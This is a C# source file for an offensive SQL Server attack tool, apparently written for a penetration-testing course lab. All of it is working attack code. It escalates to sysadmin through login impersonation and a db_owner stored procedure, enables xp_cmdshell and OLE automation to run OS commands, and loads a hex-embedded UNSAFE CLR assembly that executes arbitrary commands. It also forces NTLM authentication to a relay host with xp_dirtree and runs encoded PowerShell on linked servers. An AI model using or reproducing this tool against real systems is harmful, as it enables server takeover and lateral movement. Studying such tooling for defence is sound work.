using System;
using System.Data.SqlClient;

namespace SQLServerEx
{
    public class Program
    {
        public static void Impersonate(SqlConnection con, String impersUser)
        {
            Console.WriteLine("Executing command as " + impersUser);
            String impersonateUser = "EXECUTE AS LOGIN = '" + impersUser + "';";

            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        }

        public static void DBownerEsc(SqlConnection con, String owneddb)
        {
            
            String execCmd = "use " + owneddb + ";select db_name() as db,rp.name as database_role, mp.name as database_user from[" + owneddb + "].sys.database_role_members drm join[" + owneddb + "].sys.database_principals rp on(drm.role_principal_id = rp.principal_id) join[" + owneddb + "].sys.database_principals mp on(drm.member_principal_id = mp.principal_id) where rp.name = 'db_owner' and mp.name NOT IN('dbo')";
            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("[+] User has a dbowner role on: " + reader[0]);
            }
            reader.Close();

            Console.WriteLine("Attempting to get a sysadmin role for the user");

            String querylogin = "SELECT SYSTEM_USER;";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();
            reader.Read();
            String username = reader[0].ToString();
            reader.Close();

            execCmd = "CREATE PROCEDURE sp_elevate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '" + username + "','sysadmin'";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            execCmd = "EXEC sp_elevate;SELECT is_srvrolemember('sysadmin')";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[+] User is now a sysadmin");
            }
            else
            {
                Console.WriteLine("[-] Escalation failed");
            }
            reader.Close();
        }

        public static void Xp_cmdshell(SqlConnection con, String impersUser)
        {
            Impersonate(con, impersUser);

            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            String execCmd = "EXEC xp_cmdshell whoami";

            SqlCommand command = new SqlCommand(enable_xpcmd, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Result of command is: " + reader[0]);
            reader.Close();
        }

        public static void sp_OACreate(SqlConnection con, String impersUser)
        {
            Impersonate(con, impersUser);

            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; ";
            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";

            SqlCommand command = new SqlCommand(enable_ole, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();
        }

        public static void Relay(SqlConnection con, String relayTo)
        {
            Console.WriteLine("Executing Relay..");
            String query = "EXEC master..xp_dirtree \"\\\\" + relayTo + "\\\\test\";";
            SqlCommand command_r = new SqlCommand(query, con);
            SqlDataReader reader_r = command_r.ExecuteReader();
            reader_r.Close();
        }

        public static void RunDLL(SqlConnection con, String impersUser)
        {
            Impersonate(con, impersUser);

            String enable_options = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE";
            // Below is the hex representation of StoredProcedures.dll
            String createAsm = "CREATE ASSEMBLY myAssembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A240000000000000050450000648602000AB2D6BE0000000000000000F00022200B023000000C000000040000000000000000000000200000000000800100000000200000000200000400000000000000060000000000000000600000000200000000000003006085000040000000000000400000000000000000100000000000002000000000000000000000100000000000000000000000000000000000000000400000B8030000000000000000000000000000000000000000000000000000F4290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000CE0A000000200000000C000000020000000000000000000000000000200000602E72737263000000B80300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000E0080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E000024030000FC03000023537472696E67730000000020070000580000002355530078070000100000002347554944000000880700005801000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F0000000100000001000000030000000000640201000000000006008E011C030600FB011C030600AC00EA020F003C0300000600D40080020600710180020600520180020600E20180020600AE0180020600C70180020600010180020600C000FD0206009E00FD0206003501800206001C012D0206008E0379020A00EB00C9020A0047024B030E007103EA020A006200C9020E00A002EA0206005D0279020A002000C9020A008E0014000A00E003C9020A008600C9020600B1020A000600BE020A000000000001000000000001000100010010006003000041000100010048200000000096003500620001000921000000008618E402060002000000010056000900E40201001100E40206001900E4020A002900E40210003100E40210003900E40210004100E40210004900E40210005100E40210005900E40210006100E40215006900E40210007100E40210007900E40210008900E40206009900E4020600990092022100A90070001000B10087032600A90079031000A90019021500A900C50315009900AC032C00B900E4023000A100E4023800C9007D003F00D100A10344009900B2034A00E1003D004F00810051024F00A1005A025300D100EB034400D100470006009900950306009900980006008100E402060020007B0052012E000B0068002E00130071002E001B0090002E00230099002E002B00AF002E003300AF002E003B00AF002E00430099002E004B00B5002E005300AF002E005B00AF002E006300CD002E006B00F7002E00730004011A000480000001000000000000000000000000006003000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007902000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E670053746F72656450726F636564757265732E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F77000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F007500740070007500740000002FC630F64948694EA811BDFD67523E3700042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000001501001053746F72656450726F63656475726573000005010000000017010012436F7079726967687420C2A920203230323100002901002431363137323032372D653864632D346564322D616136342D65353632303261323966633200000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000000000000000DAB4E1E70000000002000000A20000002C2A00002C0C00000000000000000000000000001000000000000000000000000000000052534453BFA7C1D25817264D8D84CC388C3EF5AD01000000433A5C55736572735C763069645C4F6E6544726976655C446F63756D656E74735C53656375726974795C47756964656C696E65735C4F66665365635C4F5345505C6C6162735C53514C536572766572456E756D5C53746F72656450726F636564757265735C6F626A5C7836345C52656C656173655C53746F72656450726F636564757265732E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005C03000000000000000000005C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004BC020000010053007400720069006E006700460069006C00650049006E0066006F0000009802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D00650000000000000000004A0011000100460069006C0065004400650073006300720069007000740069006F006E0000000000530074006F00720065006400500072006F00630065006400750072006500730000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000004A001500010049006E007400650072006E0061006C004E0061006D0065000000530074006F00720065006400500072006F0063006500640075007200650073002E0064006C006C00000000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200310000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000005200150001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000530074006F00720065006400500072006F0063006500640075007200650073002E0064006C006C0000000000420011000100500072006F0064007500630074004E0061006D00650000000000530074006F00720065006400500072006F00630065006400750072006500730000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;";
            //String createAsm = "CREATE ASSEMBLY myAssembly FROM 'c:\\temp\\StoredProcedures.dll' WITH PERMISSION_SET = UNSAFE;";
            String createPro = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
            String execCmd = "EXEC cmdExec 'whoami && hostname'";

            String dropproc = "DROP PROCEDURE cmdExec;";
            String dropasm = "DROP ASSEMBLY myAssembly;";

            SqlCommand command = new SqlCommand(enable_options, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(createAsm, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(createPro, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[+] Result of command is: " + reader[0]);
            reader.Close();

            command = new SqlCommand(dropproc, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(dropasm, con);
            reader = command.ExecuteReader();
            reader.Close();
        }

        public static void RunLink(SqlConnection con, String link)
        {
            String LinkedServer = link;
            Console.WriteLine("Connecting to the linked server: " + LinkedServer);

            // Check linked servers

            String execCmd = "select myuser from openquery(\"" + LinkedServer + "\", 'select SYSTEM_USER as myuser')";
            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing as the login: " + reader[0] + " on " + LinkedServer);
            reader.Close();

            /*
            execCmd = "select version from openquery(\"" + LinkedServer + "\", 'select @@version as version')";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Linked SQL Server version: " + reader[0]);
            reader.Close();
            */

            String enablerpcout = "EXEC sp_serveroption '" + LinkedServer + "', 'rpc out', true;";
            command = new SqlCommand(enablerpcout, con);
            reader = command.ExecuteReader();
            reader.Close();

            execCmd = "EXEC ('sp_linkedservers') AT \"" + LinkedServer + "\"";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("[+] Linked SQL server on Linked Server: " + reader[0]);
            }
            reader.Close();

            // Execute powershell code on the linked server

            String enableadvoptions = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT \"" + LinkedServer + "\"";
            String enablexpcmdshell = "EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"" + LinkedServer + "\"";
            execCmd = "EXEC ('xp_cmdshell ''powershell -enc ZQBjAGgAbwAgADEAMgAzACAAPgAgAGMAOgBcAHQAbwBvAGwAcwBcADEAMgAzAC4AdAB4AHQACgA=''') AT \"" + LinkedServer + "\"";

            command = new SqlCommand(enableadvoptions, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enablexpcmdshell, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();
        }

        public static void Recon(SqlConnection con)
        {
            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of public role");
            }
            else
            {
                Console.WriteLine("User is NOT a member of public role");
            }
            reader.Close();

            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("User is a member of sysadmin role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of sysadmin role");
            }
            reader.Close();

            // List users to be impersonated
            String queryimperslist = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command_i = new SqlCommand(queryimperslist, con);
            SqlDataReader reader_i = command_i.ExecuteReader();
            while (reader_i.Read() == true)
            {
                Console.WriteLine("[+] Logins that can be impersonated: " + reader_i[0]);
            }
            reader_i.Close();

            // List linked Servers
            String execCmd = "EXEC sp_linkedservers;";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("[+] Linked SQL server: " + reader[0]);
            }
            reader.Close();

            execCmd = "SELECT d.name AS DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN('MSDB') and r.type = 'R' and r.name = N'sysadmin'";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("[+] Trusted databases owned by sysadmins: " + reader[0]);
            }
            reader.Close();
        }
        public static void StartR(string command)
        {
            string[] args = command.Split();
            Main(args);
        }
        static void Main(string[] args)
        {
            ArgumentParser argp = new ArgumentParser();
            var a = argp.Parse(args);
            string username = a.GetValue("u", "user", "username");
            string password = a.GetValue("p", "pwd", "pass", "password");
            string sqlServer = a.GetValue("s", "server");
            string database = a.GetValue("d", "db");
            string relayTo = a.GetValue("r", "relayto");
            string linkSrv = a.GetValue("l", "link");
            string impersUser = a.GetValue("i", "impers");
            string exploit = a.GetValue("e", "exploit");
            string owneddb = a.GetValue("o", "odb");

            if (string.IsNullOrWhiteSpace(sqlServer))
                sqlServer = Program.Prompt("sqlServer");
            if (string.IsNullOrWhiteSpace(sqlServer))
            {
                Console.WriteLine("Server value is not provided");
                return;
            }

            if (string.IsNullOrWhiteSpace(database))
            {
                database = "master";
            }


            String conString = "";

            if (string.IsNullOrWhiteSpace(username))
            {
                Console.WriteLine("Connecting to server " + sqlServer + " database " + database);
                conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            }

            else
            {
                if (string.IsNullOrWhiteSpace(password))
                    password = Program.Prompt("password");
                if (string.IsNullOrWhiteSpace(password))
                {
                    Console.WriteLine("Password value is not provided");
                    return;
                }

                Console.WriteLine("Connecting to server " + sqlServer + " database " + database + " under username " + username + " with password " + password);

                conString = @"Data Source=" + sqlServer + ";Initial Catalog=" + database + ";User ID=" + username + ";Password=" + password;
            }

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Auth success!");
            }
            catch
            {
                Console.WriteLine("[-] Auth failed");
                return;
            }

            Recon(con);
            
            if (string.IsNullOrWhiteSpace(impersUser))
            {
                impersUser = "sa";
            }

            if (!string.IsNullOrWhiteSpace(exploit))
            {

                switch (exploit)
                {
                    case "escalate":
                        DBownerEsc(con, owneddb);
                        break;

                    case "link":
                        // Requires -l to be set to target linked server

                        RunLink(con, linkSrv);
                        break;

                    case "relay":
                        // Requires -r to be set to target server

                        Relay(con, relayTo);
                        break;

                    case "sp":
                        // Provide the user to impersonate, otherwise will try sa.

                        sp_OACreate(con, impersUser);
                        break;

                    case "xpshell":
                        Xp_cmdshell(con, impersUser);
                        break;

                    case "rundll":
                        RunDLL(con, impersUser);
                        break;

                    default:
                        Console.WriteLine("[-] Exploit name not found.");
                        break;
                }
            }

            con.Close();
        }
        static string Prompt(string description)
        {
            Console.Write($"Please enter {description}: ");
            string value = Console.ReadLine();
            return value;
        }
    }
}
